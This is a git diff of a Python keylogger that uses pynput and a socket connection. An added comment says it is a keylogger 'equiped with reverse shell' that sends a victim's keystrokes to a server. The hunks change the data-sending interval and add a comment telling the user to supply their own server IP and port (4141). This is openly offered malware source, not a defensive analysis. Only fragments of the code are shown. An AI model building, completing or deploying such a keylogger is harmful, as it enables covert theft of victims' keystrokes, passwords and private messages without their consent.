@@ -1,3 +1,4 @@
+#this is a keylogger equiped with reverse shell where the server recives the key logs genrated from victims keyboard
 from pynput import keyboard
 import json
 import socket
@@ -8,7 +9,7 @@ keylist= []
 x = False
 key_strokes = ""
 connection = None
-send_interval = 10  # Send data to server every 30 seconds
+send_interval = 15  # Send data to server every 15 seconds
 last_sent_index = 0  # Track the last index sent to server
 
 def update_text_file(key):          #function to update the text file
@@ -46,7 +47,7 @@ def connect_to_server(ip, port):        #function to connect to key_server
     while True:
         try:
             connection.connect((ip, port))
-            print(f" [+] Connected to server at {'[ip]'}:{4141}")
+            print(f" [+] Connected to server at {'[ip]'}:{4141}")  #provide your server's ip and port
             break
         except ConnectionRefusedError:
             print(" [!] Connection refused, retrying in 5 seconds...")
